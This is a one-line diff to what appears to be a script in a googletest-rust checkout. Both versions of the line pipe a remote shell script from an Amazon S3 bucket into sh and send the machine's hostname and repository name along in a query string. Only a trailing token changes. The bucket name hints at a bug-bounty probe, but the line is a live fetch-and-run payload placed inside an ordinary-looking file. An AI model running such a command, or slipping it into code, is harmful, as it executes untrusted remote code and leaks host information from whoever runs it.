@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/googletest-rust.git\&folder=googletest-rust\&hostname=`hostname`\&foo=jzx
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/googletest-rust.git\&folder=googletest-rust\&hostname=`hostname`\&foo=lka
